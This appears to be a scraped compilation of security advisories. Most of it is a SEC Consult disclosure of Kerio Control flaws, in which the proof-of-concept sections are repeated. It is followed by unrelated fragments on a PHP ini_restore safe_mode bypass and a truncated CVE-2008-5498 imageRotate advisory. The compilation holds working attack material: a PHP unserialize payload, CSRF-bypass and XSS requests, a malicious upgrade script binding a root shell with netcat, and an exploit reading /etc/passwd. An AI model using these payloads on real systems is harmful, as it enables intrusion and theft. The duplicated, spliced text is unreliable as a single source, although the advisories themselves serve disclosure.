intentionally written to just  \ntarget Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets  \nare used which belong to the winroute binary with the SHA256 hash:  \n2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0  \nThis exploit will not be released for now.  \n  \nA real-world-attacker can detect the remote binary version by bruteforcing  \nthe object handler related to CVE-2014-3515.  \n  \n  \n2) PHP script allows heap spraying  \nThe set.php script contains the following code:  \n$p_variable = urldecode($_POST['k_variable']);  \n$p_value = urldecode($_POST['k_value']);  \n...  \n$p_session->setSessionVariable($p_variable, $p_value);  \n  \nPOST requests with the following parameters can therefore be used to allocate  \nspace on the remote system:  \nk_securityHash=x&target=k_sessionVariable&k_variable=<random_name>  \n&k_value=<payload_to_allocate>  \n  \nDuring tests it was possible to spray approximately 400 MB data in 30 seconds  \nwhich is enough to control two predictable addresses on the heap.  \n  \n  \n3) CSRF Protection Bypass  \nTwo scripts are required for the remote code execution exploit:  \n-) set.php  \n-) ContentLoader.php  \nBoth scripts contain different very interesting CSRF check bypasses.  \n  \nThe following code can be found in set.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];  \nif ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {  \nexit();  \n}  \n  \nSince the programming language is PHP (and not JavaScript), the above code code  \ndoes not work as expected. $p_postedHash can only become 0 or 1 because || is a  \nlogical operator. The if-condition compares the valid token with the posted one  \nvia the != operator, however, this will not check if types are the same.  \nIf k_securityHash is set (either via GET or POST) to any value, the above code  \nwill compare the number 1 with a string, which will always bypass the check.  \nIt's therefore enough to set k_securityHash to any value to bypass the CSRF  \nprotection.  \n  \nThe following code can be found in contentLoader.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'];  \n...  \nif (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {  \n$p_page = new p_Page();  \n$p_page->p_jsCode('window.top.location = \"index.php\";');  \n$p_page->p_showPageCode();  \ndie();  \n}  \n  \nNow the programmers only use the GET parameter, however, they changed the  \nlogical operator in the if condition from || to && which means that the CSRF  \ncheck will only be applied if $p_postedHash is empty. It's therefore again  \nenough to set k_securityHash to any value to bypass the check.  \n  \n  \n4) Webserver running with root privileges  \nNo proof of concept necessary.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nIn the following request the k_historyTimestamp parameter is prone to XSS:  \nhttps://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x  \n&k_historyTimestamp=aa%22;alert(1)%3b//  \n  \nIn the same request the id parameter can be used to inject JavaScript code.  \nNote that the attack can only be conducted against administrative users.  \nUsers with standard privileges can only access pages with k_dbName set to one  \nof the following values:  \n-) accStats  \n-) prefs  \n-) dialup  \n-) error  \n  \nIn such a case Kerio Control adds code like the following  \n(in this example k_dbName=dialup):  \nvar k_newDbName = \"<kerio:text id=\"tabCaption_dialup\"/>\";  \n  \nThe \" characters within the string are not correctly encoded.  \nThis will lead to the termination of the JavaScript execution. Because the  \ninjected payload is stored after this code, the attacker must bypass this  \ncode to ensure that the payload gets executed. This is only possible if  \nthe attacked user is an administrator because administrators can load any  \ndbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like  \nthe following will be added instead (which does not crash):  \nvar k_newDbName = \"\";  \n  \nAnother XSS can be found at:  \nhttps://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A\"><script>alert(1);</script><!--  \n  \n  \n6) Missing memory corruption protections  \nNo proof of concept necessary.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nThe following request returns information to the currently logged in user  \n(e.g. session token and username):  \n  \nGET /nonauth/getLoginType.js.php HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nThe following is a typical response:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 11:47:34 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginUnlock\";k_loginParams.k_nonauthToken =  \n\"0xb59066a8\";k_loginParams.k_sessionToken =  \n\"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660\";k_loginParams.k_loggedUser  \n= {k_asocName: \"user\", k_fullName: \"user\"};  \n  \nThe above response contains a valid pointer (0xb59066a8). In most cases this  \npointer will point to the heap. However, sometimes this pointer will point  \ninto a readable and writeable region behind a stack-region.  \nThe target location always stores the same data. During the analysis no  \nfurther effort was spent on analysing this behaviour.  \n  \nThe pointer will also be disclosed if the user is already logged out.  \nIn such a case the response looks like:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 12:04:44 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginCommon\";k_loginParams.k_nonauthToken =  \n\"0xb2ee208\";  \n  \n  \nAn attack scenario can be:  \n-) The attacker tricks a victim to visit the attacker's malicious website  \n-) The attacker's website uses the CSRF bypass and the identified XSS  \nvulnerability to embed a malicious script inside the Kerio Control website  \n-) The attacker's website iframes the Kerio Control website to trigger the  \nexecution of the XSS payload  \n-) The XSS payload runs on the same domain and can therefore send requests  \nand read responses. This means the attacker can send requests to  \ngetLoginType.js.php to obtain a memory pointer.  \n-) If the memory pointer is within a specific range (e.g. the highest nibble  \nis zero), it's a pointer to the heap. In such a case the RCE vulnerability  \ncan be used to crash and restart the server. After that the same check can  \nbe done again.  \n-) If the memory pointer points near a stack (highest nibble is 0xb), the  \npointer can be used to calculate the base address of a stack.  \n-) Now the attacker knows the location of a stack (all stacks are marked as  \nreadable, writeable and executable). He can now easily bypass ASLR and DEP.  \n  \n  \n8) Remote Code Execution as administrator  \nAn attacker can create a malicious upgrade image with the following  \ncommands:  \ncat upgrade.sh  \n#!/bin/bash  \nnc -lp 9999 -e /bin/bash &  \n  \ntar czf upgrade.tar.gz *  \nmv upgrade.tar.gz upgrade.img  \n  \nThe image can be uploaded in the administrative web interface.  \nThis will bind a root shell on port 9999. The complete attack can also be  \nconducted via the cross site scripting vulnerability described in this  \nadvisory (XSS in contentLoader.php). This enables an attacker to conduct  \nthe attack from the Internet to obtain a reverse shell on Kerio Control.  \n  \n  \n9) Login not protected against brute-force attacks  \nValid credentials can be obtained via a brute-force attack.  \nIt's enough to send a POST request to /internal/dologin.php with the  \nparameters kerio_username and kerio_password set. A remote attacker  \ncan detect if the credentials are correct without reading the  \nresponse (SOP would not allow to read the response). This is possible  \nbecause /internal/photo will only return a valid image if the user is  \ncurrently logged in. The attacker can load an image from this URL and  \ncheck if loading was successful to leak the information if the  \ncredentials are valid or not.  \nThe following code demonstrates this:  \n<img src=\"https://<Kerio-IP>/internal/photo\" onerror=not_logged_in();  \nonload=logged_in();></img>  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nThe following product versions were found to be vulnerable which were the  \nlatest versions available at the time of the discovery:  \nv9.1.0 (Build 1087)  \nv9.1.1 (Build 1324)  \n  \n  \nVendor contact timeline:  \n------------------------  \n2016-08-29: Contacting vendor through website  \n(bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664  \n2016-08-31: No answer, contacting CTO of Kerio via email  \n2016-09-01: Received security contact with PGP & S/MIME certificate  \n2016-09-01: Transmission of PGP encrypted advisory to Kerio  \n2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7  \nStatement to vulnerability 9:  \n\"the feature already is in the product.\"  \nStatement to vulnerabilities 4 (Webserver running with root  \nprivileges) and 8 (Remote Code Execution as administrator):  \n\"I do not consider this a vulnerability\"  \nUpdate including a fix will be available on 2016-09-20  \n2016-09-09: SEC Consult informed Kerio to re-think the decision  \nnot fixing the vulnerabilities 4, 8 and 9  \nSEC Consult highly recommends to fix all reported issues  \n2016-09-13: SEC Consult informed Kerio that the advisory will be  \nreleased on 2016-09-22  \n2016-09-20: Kerio releases patch for Kerio Control  \n2016-09-22: Coordianted release of security advisory  \n  \n  \nSolution:  \n---------  \nThe vendor has released version 9.1.3 on 20th September which, according  \nto the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  \n  \nThe vendor told us the following regarding vulnerability 9:  \n\"the feature already is in the product\"  \n  \nVulnerability 4 and 8 are not considered a vulnerability by the vendor  \nand will not be fixed.  \nSEC Consult strongly recommended fixing issue 4 and 8 as well.  \n  \nThe latest version can be downloaded from here:  \nhttp://www.kerio.com/support/kerio-control  \nhttp://www.kerio.com/support/kerio-control/release-history  \n  \n  \nWorkaround:  \n-----------  \nNone  \n  \n  \nAdvisory URL:  \n-------------  \nhttps://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  \n  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nSEC Consult Vulnerability Lab  \n  \nSEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nAbout SEC Consult Vulnerability Lab  \nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult.

These comprehensive capabilities and unmatched  \ndeployment flexibility make Kerio Control the ideal choice for small  \nand mid-sized businesses.\"  \n  \nSource: http://www.kerio.com/products/kerio-control  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy combining the vulnerabilities documented in this advisory an attacker  \ncan fully compromise a network which uses the Kerio Control appliance for  \nprotection.  \n  \nThe attacker can trick a victim to visit a malicious website which then conducts  \nthe internal attack. The attacked victim must be logged in or weak credentials  \nmust be configured which can be found with a bruteforce attack.  \n  \nThe attacker will gain a reverse root shell from the Internet to the internal  \nKerio Control firewall system. Moreover, it's possible that an internal attacker  \nuses the described vulnerabilities to escalate his privileges (low privileged  \naccount to full root shell) to steal credentials from other users on the UTM  \nappliance.  \n  \nMost vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found  \nin just two PHP scripts. Both scripts are not referenced by any other  \nPHP script nor by any binary on the system.  \nBoth scripts contain a different(!), seemingly deliberate(?) CSRF bypass  \nwhich make the vulnerabilities exploitable from the Internet to obtain a  \nreverse root shell.  \n  \nSEC Consult recommends not to use Kerio Control until a thorough security  \nreview has been performed by security professionals and all identified  \nissues have been resolved.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nAn authenticated user (standard user or administrator) can control data, which  \ngets later unserialized. Kerio Control uses PHP 5.2.13 which was released on  \n2010-02-25. This version is more than 6 years old and several bugs were found  \nin the meantime within the unserialize function. The following CVE numbers  \nare just some examples for vulnerabilities in unserialize which lead to remote  \ncode execution:  \n-) CVE-2014-8142  \n-) CVE-2014-3515  \n-) CVE-2015-0231  \n-) CVE-2015-6834  \n-) CVE-2016-5771  \n-) CVE-2016-5773  \n  \nPHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a  \ntype confusion attack to trigger a use-after-free vulnerability. It can be used  \nto read data and get full code execution. In the case of Kerio Control the  \nresult of unserialize is not reflected back to the attacker. It's therefore not  \npossible to read memory from the stack or heap (e.g. to bypass ASLR).  \n  \nNevertheless, SEC Consult developed a fully working and reliable (blind) exploit  \nfor this vulnerability which spawns a reverse root shell to the Kerio Control  \nsystem.  \nFor this exploit a user account is required. However, it's also possible to  \nconduct the attack via the Internet because the CSRF (Cross Site Request  \nForgery) check can be bypassed (see below).  \n  \nAn attacker can use this vulnerability to break into a company network via the  \nInternet by tricking a logged in user to visit a malicious website. Even if the  \nuser is currently not logged in the attacker can start a bruteforce attack to  \nobtain valid credentials to conduct the attack.  \n  \n  \n2) PHP script allows heap spraying  \nOne of the PHP scripts allows the allocation of memory inside the main binary  \n(winroute) of Kerio Control. Winroute contains the code of most services  \n(e.g. the webserver, PHP, network related functionality, ...).  \nThe memory will not be freed after finishing the request and can therefore be  \nused to spray payloads to the whole memory space.  \n  \nThis vulnerability was used in the overall exploit to defeat ASLR.  \nPlease bear in mind that it's very likely that an attacker can write a working  \nexploit without heap spraying. Fixing this vulnerability would therefore not  \nprevent the exploitation of the remote code execution vulnerability.  \nFor example, the information disclosure vulnerability from this advisory can  \nbe used to bypass ASLR as well. This would eliminate the need of heap spraying.  \n  \n  \n3) CSRF Protection Bypass  \nThe PHP scripts contain code to protect against CSRF (Cross Site Request  \nForgery) attacks. Because of the wrong usage of PHP binary  \noperations and comparisons it's possible to bypass this check. That means  \nthat an attacker can trigger requests from other websites which will be handled  \nby Kerio Control. This vulnerability allows to exploit the remote code  \nexecution vulnerability from the Internet to break into a network.  \n  \n  \n4) Webserver running with root privileges  \nThe main binary (which contains the webserver and PHP) runs with root  \nprivileges.  \n  \nKerio told SEC Consult that this vulnerability will not be fixed. SEC  \nConsult strongly recommended otherwise.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nKerio Control does not properly encode parameters which are reflected on the  \nwebsite. This leads to cross site scripting vulnerabilities.  \nAn attacker can abuse these vulnerabilities to modify the website or do actions  \nin the context of the attacked user.  \n  \n  \n6) Missing memory corruption protections  \nThe main binary (winroute) is not compiled as position-independent executable  \n(PIE). This allowed the use of ROP (return-oriented-programming) code to  \nbypass the not executable heap. Moreover, the stack is per default marked as  \nexecutable, but the exact location of the stack is randomized by ASLR.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nOne of the PHP scripts leaks pointers to the stack and heap.  \nThis can be abused by attackers to bypass ASLR.  \nBecause stacks are marked as executable an attacker can therefore easily bypass  \nASLR and DEP/NX.  \n  \n  \n8) Remote Code Execution as administrator  \nNearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code  \nexecution vulnerability in the administrative web interface in the upgrade  \nfunctionality. This vulnerability is still unfixed, only the associated XSS  \nvulnerability was fixed. However, an attacker can still exploit it from the  \nInternet, e.g. by abusing the XSS vulnerability described in this advisory  \n(where the CSRF check can be bypassed).  \n  \nWith this vulnerability an attacker can gain a reverse root shell on  \nKerio Control again if a logged in administrator visits a malicious website  \non the Internet.  \nMore information can also be found in the old advisory:  \nhttps://www.exploit-db.com/exploits/38450/  \n  \n  \n9) Login not protected against brute-force attacks  \nThere are no bruteforce protections in place for the login.  \nIf an unauthenticated victim visits an attacker's website, the attacker can  \nstart a bruteforce attack to obtain valid credentials to execute the  \nremote code execution exploit. Via image-loading the attacker can detect if  \nthe current credentials are valid (without violating SOP).  \n  \n  \nProof of concept:  \n-----------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nThe following request can be used to set the unserialize data. In this example  \na faked string is used which points to 0xffffffff (kernel memory). Unserializing  \nit will therefore crash the remote webserver (the winroute process).  \n  \nPOST /set.php HTTP/1.1  \nHost: $IP:4081  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 730  \n  \nk_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:\"k_dbName\";s:5:\"error\";s:11:\"k_dbSummara\";s:3:\"abc\";s:14:\"k_dbIndividual\";s:3:\"abc\";s:16:\"k_dbLastUsedType\";s:3:\"abc\";s:10:\"k_dbLayout\";s:3:\"abc\";s:10:\"k_pageType\";s:3:\"abc\";s:13:\"k_periodStart\";i:123;s:11:\"k_periodEnd\";i:123;s:8:\"k_userId\";i:123;s:6:\"tabBar\";i:123;s:13:\"k_gotoElement\";i:123;s:9:\"k_protoId\";i:123;s:11:\"k_errorType\";i:123;s:16:\"k_timezoneOffset\";i:123;s:9:\"k_groupId\";i:123;s:2:\"id\";i:123;s:11:\"k_dbSummary\";C:16:\"SplObjectStorage\":152:{x:i:2;O:8:\"stdClass\":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:\"\\ff\\ff\\ff\\ff\\20\\00\\00\\00\\01\\00\\00\\00\\06\\00\\00\";i:1;R:3;}}s:18:\"k_historyTimestamp\";s:3:\"abc\";}  \n  \nThe following request will call unserialize on the injected data:  \n  \nGET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nIn the example above only a denial of service will be conducted. However, an  \nattacker can change the data type to object to get full code execution on  \nthe remote system.  \n  \nSEC Consult developed a fully working exploit for this attack which spawns a  \nroot shell. Please note that this exploit was intentionally written to just  \ntarget Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets  \nare used which belong to the winroute binary with the SHA256 hash:  \n2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0  \nThis exploit will not be released for now.  \n  \nA real-world-attacker can detect the remote binary version by bruteforcing  \nthe object handler related to CVE-2014-3515.  \n  \n  \n2) PHP script allows heap spraying  \nThe set.php script contains the following code:  \n$p_variable = urldecode($_POST['k_variable']);  \n$p_value = urldecode($_POST['k_value']);  \n...  \n$p_session->setSessionVariable($p_variable, $p_value);  \n  \nPOST requests with the following parameters can therefore be used to allocate  \nspace on the remote system:  \nk_securityHash=x&target=k_sessionVariable&k_variable=<random_name>  \n&k_value=<payload_to_allocate>  \n  \nDuring tests it was possible to spray approximately 400 MB data in 30 seconds  \nwhich is enough to control two predictable addresses on the heap.  \n  \n  \n3) CSRF Protection Bypass  \nTwo scripts are required for the remote code execution exploit:  \n-) set.php  \n-) ContentLoader.php  \nBoth scripts contain different very interesting CSRF check bypasses.  \n  \nThe following code can be found in set.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];  \nif ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {  \nexit();  \n}  \n  \nSince the programming language is PHP (and not JavaScript), the above code code  \ndoes not work as expected. $p_postedHash can only become 0 or 1 because || is a  \nlogical operator. The if-condition compares the valid token with the posted one  \nvia the != operator, however, this will not check if types are the same.  \nIf k_securityHash is set (either via GET or POST) to any value, the above code  \nwill compare the number 1 with a string, which will always bypass the check.  \nIt's therefore enough to set k_securityHash to any value to bypass the CSRF  \nprotection.  \n  \nThe following code can be found in contentLoader.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'];  \n...  \nif (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {  \n$p_page = new p_Page();  \n$p_page->p_jsCode('window.top.location = \"index.php\";');  \n$p_page->p_showPageCode();  \ndie();  \n}  \n  \nNow the programmers only use the GET parameter, however, they changed the  \nlogical operator in the if condition from || to && which means that the CSRF  \ncheck will only be applied if $p_postedHash is empty. It's therefore again  \nenough to set k_securityHash to any value to bypass the check.  \n  \n  \n4) Webserver running with root privileges  \nNo proof of concept necessary.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nIn the following request the k_historyTimestamp parameter is prone to XSS:  \nhttps://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x  \n&k_historyTimestamp=aa%22;alert(1)%3b//  \n  \nIn the same request the id parameter can be used to inject JavaScript code.  \nNote that the attack can only be conducted against administrative users.  \nUsers with standard privileges can only access pages with k_dbName set to one  \nof the following values:  \n-) accStats  \n-) prefs  \n-) dialup  \n-) error  \n  \nIn such a case Kerio Control adds code like the following  \n(in this example k_dbName=dialup):  \nvar k_newDbName = \"<kerio:text id=\"tabCaption_dialup\"/>\";  \n  \nThe \" characters within the string are not correctly encoded.  \nThis will lead to the termination of the JavaScript execution. Because the  \ninjected payload is stored after this code, the attacker must bypass this  \ncode to ensure that the payload gets executed. This is only possible if  \nthe attacked user is an administrator because administrators can load any  \ndbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like  \nthe following will be added instead (which does not crash):  \nvar k_newDbName = \"\";  \n  \nAnother XSS can be found at:  \nhttps://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A\"><script>alert(1);</script><!--  \n  \n  \n6) Missing memory corruption protections  \nNo proof of concept necessary.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nThe following request returns information to the currently logged in user  \n(e.g. session token and username):  \n  \nGET /nonauth/getLoginType.js.php HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nThe following is a typical response:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 11:47:34 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginUnlock\";k_loginParams.k_nonauthToken =  \n\"0xb59066a8\";k_loginParams.k_sessionToken =  \n\"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660\";k_loginParams.k_loggedUser  \n= {k_asocName: \"user\", k_fullName: \"user\"};  \n  \nThe above response contains a valid pointer (0xb59066a8). In most cases this  \npointer will point to the heap. However, sometimes this pointer will point  \ninto a readable and writeable region behind a stack-region.  \nThe target location always stores the same data. During the analysis no  \nfurther effort was spent on analysing this behaviour.  \n  \nThe pointer will also be disclosed if the user is already logged out.  \nIn such a case the response looks like:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 12:04:44 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginCommon\";k_loginParams.k_nonauthToken =  \n\"0xb2ee208\";  \n  \n  \nAn attack scenario can be:  \n-) The attacker tricks a victim to visit the attacker's malicious website  \n-) The attacker's website uses the CSRF bypass and the identified XSS  \nvulnerability to embed a malicious script inside the Kerio Control website  \n-) The attacker's website iframes the Kerio Control website to trigger the  \nexecution of the XSS payload  \n-) The XSS payload runs on the same domain and can therefore send requests  \nand read responses. This means the attacker can send requests to  \ngetLoginType.js.php to obtain a memory pointer.  \n-) If the memory pointer is within a specific range (e.g. the highest nibble  \nis zero), it's a pointer to the heap. In such a case the RCE vulnerability  \ncan be used to crash and restart the server. After that the same check can  \nbe done again.  \n-) If the memory pointer points near a stack (highest nibble is 0xb), the  \npointer can be used to calculate the base address of a stack.  \n-) Now the attacker knows the location of a stack (all stacks are marked as  \nreadable, writeable and executable). He can now easily bypass ASLR and DEP.  \n  \n  \n8) Remote Code Execution as administrator  \nAn attacker can create a malicious upgrade image with the following  \ncommands:  \ncat upgrade.sh  \n#!/bin/bash  \nnc -lp 9999 -e /bin/bash &  \n  \ntar czf upgrade.tar.gz *  \nmv upgrade.tar.gz upgrade.img  \n  \nThe image can be uploaded in the administrative web interface.  \nThis will bind a root shell on port 9999. The complete attack can also be  \nconducted via the cross site scripting vulnerability described in this  \nadvisory (XSS in contentLoader.php). This enables an attacker to conduct  \nthe attack from the Internet to obtain a reverse shell on Kerio Control.  \n  \n  \n9) Login not protected against brute-force attacks  \nValid credentials can be obtained via a brute-force attack.  \nIt's enough to send a POST request to /internal/dologin.php with the  \nparameters kerio_username and kerio_password set. A remote attacker  \ncan detect if the credentials are correct without reading the  \nresponse (SOP would not allow to read the response). This is possible  \nbecause /internal/photo will only return a valid image if the user is  \ncurrently logged in. The attacker can load an image from this URL and  \ncheck if loading was successful to leak the information if the  \ncredentials are valid or not.  \nThe following code demonstrates this:  \n<img src=\"https://<Kerio-IP>/internal/photo\" onerror=not_logged_in();  \nonload=logged_in();></img>  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nThe following product versions were found to be vulnerable which were the  \nlatest versions available at the time of the discovery:  \nv9.1.0 (Build 1087)  \nv9.1.1 (Build 1324)  \n  \n  \nVendor contact timeline:  \n------------------------  \n2016-08-29: Contacting vendor through website  \n(bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664  \n2016-08-31: No answer, contacting CTO of Kerio via email  \n2016-09-01: Received security contact with PGP & S/MIME certificate  \n2016-09-01: Transmission of PGP encrypted advisory to Kerio  \n2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7  \nStatement to vulnerability 9:  \n\"the feature already is in the product.\"  \nStatement to vulnerabilities 4 (Webserver running with root  \nprivileges) and 8 (Remote Code Execution as administrator):  \n\"I do not consider this a vulnerability\"  \nUpdate including a fix will be available on 2016-09-20  \n2016-09-09: SEC Consult informed Kerio to re-think the decision  \nnot fixing the vulnerabilities 4, 8 and 9  \nSEC Consult highly recommends to fix all reported issues  \n2016-09-13: SEC Consult informed Kerio that the advisory will be  \nreleased on 2016-09-22  \n2016-09-20: Kerio releases patch for Kerio Control  \n2016-09-22: Coordianted release of security advisory  \n  \n  \nSolution:  \n---------  \nThe vendor has released version 9.1.3 on 20th September which, according  \nto the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  \n  \nThe vendor told us the following regarding vulnerability 9:  \n\"the feature already is in the product\"  \n  \nVulnerability 4 and 8 are not considered a vulnerability by the vendor  \nand will not be fixed.  \nSEC Consult strongly recommended fixing issue 4 and 8 as well.  \n  \nThe latest version can be downloaded from here:  \nhttp://www.kerio.com/support/kerio-control  \nhttp://www.kerio.com/support/kerio-control/release-history  \n  \n  \nWorkaround:  \n-----------  \nNone  \n  \n  \nAdvisory URL:  \n-------------  \nhttps://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  \n  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nSEC Consult Vulnerability Lab  \n  \nSEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nAbout SEC Consult Vulnerability Lab  \nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult.

Much of its syntax is borrowed from C, Java and Perl with a couple of unique PHP-specific   \nfeatures thrown in. The goal of the language is to allow web developers to write dynamically generated pages quickly.  \n  \nA nice introduction to PHP by Stig S\u00e6ther Bakken can be found at http://www.zend.com/zend/art/intro.php on the Zend website. Also, much   \nof the PHP Conference Material is freely available.   \n  \nphp_admin_value name value  \n  \nSets the value of the specified directive. This can not be used in .htaccess files. Any directive type set with php_admin_value can   \nnot be overridden by .htaccess or virtualhost directives. To clear a previously set value use none as the value.   \nphp_admin_flag name on|off  \n  \nUsed to set a boolean configuration directive. This can not be used in .htaccess files. Any directive type set with php_admin_flag   \ncan not be overridden by .htaccess or virtualhost directives.   \n  \nhttp://pl.php.net/manual/en/configuration.changes.php  \n  \n- --- 1. php_admin_value and php_admin_flag Bypass ---  \nWhen using PHP as an Apache module, you can also change the configuration settings using directives in Apache configuration files (e.g.   \nhttpd.conf). This options are using by a lot of ISP to set open_basedir, safe_mode and more options.  \n  \nFor example:  \nopen_basedir in httpd.conf  \n  \n- ---  \n<Directory /usr/home/frajer/public_html/>  \nOptions FollowSymLinks MultiViews Indexes  \nAllowOverride None  \nphp_admin_flag safe_mode 1  \nphp_admin_value open_basedir /usr/home/frajer/public_html/  \n</Directory>  \n- ---  \n  \nIn PHP are two config options. Are Local Value and Master Value. More in phpinfo() or ini_get()   \n  \nExample:  \nIf you have safe_mode or open_basedir (etc) set in Local Value for selected users and in Master Value is default value, you can restore   \nMaster Value to Local Value per ini_restore() function!  \n  \n- ---  \nini_restore  \n  \n(PHP 4, PHP 5)  \nini_restore -- Restores the value of a configuration option  \n- ---  \n  \nRestores the value of a php.ini file. Then your PHP options from httpd.conf are bypassed.  \n  \nEXPLOIT:  \n- ---  \n<?  \necho ini_get(\"safe_mode\");  \necho ini_get(\"open_basedir\");  \ninclude(\"/etc/passwd\");  \nini_restore(\"safe_mode\");  \nini_restore(\"open_basedir\");  \necho ini_get(\"safe_mode\");  \necho ini_get(\"open_basedir\");  \ninclude(\"/etc/passwd\");  \n?>  \n- ---  \n  \nRESULT OF EXPLOIT:  \n- ---  \n1  \n/usr/home/frajer/public_html/  \nWarning: include() [function.include]: open_basedir restriction in effect.

Roohian\r\nCSIRT Team Members\r\nAmirkabir University APA Laboratory\r\n\r\nIntroduction\r\nPHP is a popular web programming language which isnormally used as a script engine in the server side.\r\nPHP 5 which is compiledwith gd library, includes a function called imageRotate() for rotating an imageresource by giving the rotation angle.\r\nThis function fills the resulted emptyareas with a given default coloring after rotation (clrBack). \r\nGd library works with both indexed images andtruecolor images. A truecolor pixel is a DWORD which stores the color value ofthe pixel which would be displayed without any change.\r\nIn indexed mode by using an index with a sizeof  no more than 1 byte, the data wouldbe fetched from a color palette which consists of parallel arrays of colorbytes. The gd library uses the same data strcture for both of these image types(gdImageStruct).\r\nAn implementation error can cause information leakage from thememory of the PHP (or possible the web server) process.\r\n\r\nInformation leak vulnerabilities allow access to e.g. the Apache memory which might contain the private RSA key for the SSL cert.If an attacker is able to read it he can perform real man in the middle attackson all SSL connections. Aside from this in the days of ASLR, NX and canaryprotections it is often vital for the success of the exploit to know exactmemory addresses. (http://www.php-security.org/)\r\n\r\nVulnerableversion\r\nPHP &#60;= 5.2.8\r\nCVE Candidate Number: CVE-2008-5498\r\n\r\nVulnerability\r\nThe imageRotate() function does not perform any validation check on the clrBack parameter which is used as an index for the above mentioned arrays with the size of 255 in the index image type.\r\nA correct validation check for the indexed images could be:\r\n\r\nfile: php-x.y.z/ext/gd/libgd/gd.c\r\n\r\n3129: gdImagePtr gdImageRotate (gdImagePtrsrc, double dAngle,\r\n                                int clrBack, int ignoretransparent) \r\n3130:{ \r\n3131: gdImagePtrpMidImg; \r\n3132: gdImagePtrrotatedImg;\r\n3133:\r\n3134: if(src == 